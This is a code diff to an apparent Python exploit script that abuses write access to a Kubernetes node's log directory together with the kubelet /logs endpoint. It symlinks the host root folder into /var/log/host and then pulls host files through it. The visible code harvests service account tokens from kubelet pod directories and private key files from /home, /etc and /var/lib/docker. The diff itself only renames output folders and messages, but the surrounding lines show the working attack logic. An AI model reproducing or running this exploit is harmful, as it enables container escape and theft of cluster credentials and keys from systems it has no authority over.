@@ -20,13 +20,13 @@ def attach_to_root():
 def detach_from_root():
     os.remove("/var/log/host/root_link")
 
-def download_file(path, output_folder="./downloads"):
+def download_file(path, output_folder="./host_files"):
     file_path = "{}/{}".format(output_folder, path.replace('/', '.')[1:])[:-1]
     # maximum filename length
     file_path = file_path[:250] if len(file_path) > 250 else file_path
     with open(file_path, 'wb') as f:
         f.write(s.get(LOGS_URL+'/root_link/'+path).content)
-    print("[*] downloaded: {}".format(path))
+    print("[*] extracted hostfile: {}".format(path))
 
 def read_folder(path):
     soup = BeautifulSoup(s.get(LOGS_URL+'/root_link'+path).text, 'html.parser')
@@ -53,13 +53,13 @@ def extract_kuberenetes_tokens():
     duplicate_token_pattern = re.compile(r".*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+")
     def filtered_token(x):
         if not duplicate_token_pattern.match(x):
-            download_file(x, output_folder='./downloads/tokens')       
+            download_file(x, output_folder='./host_files/tokens')       
     find_files("/var/lib/kubelet/pods/", query="token", process_file=filtered_token)
 
 def extract_private_keys():
     """finds and downloads all private_key files found on the host"""
     def key_download(x):
-        download_file(x, output_folder="./downloads/private_keys")
+        download_file(x, output_folder="./host_files/private_keys")
     find_files("/home/", query="*.key", process_file=key_download)
     find_files("/etc/", query="*.key", process_file=key_download)
     find_files("/var/lib/docker/", query="*.key", process_file=key_download)
@@ -81,7 +81,7 @@ def exploit():
     finally:
         print("[+] removing symlink to host root folder")
         detach_from_root()
-        print("[*] Done. check the downloaded folder for extracted root files.")    
+        print("[*] Done. check the host_files folder for extracted root files.")    
 
 if __name__ == "__main__":
     with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:    
@@ -92,5 +92,5 @@ if __name__ == "__main__":
     if s.get(LOGS_URL).status_code != 200:
         print("[-] Cannot run exploit, no permissions to access /logs on the kubelet")
         sys.exit(1)
-    print("[*] Got access to kubelet /logs")
+    print("[*] Got access to kubelet /logs endpoint")
     exploit()
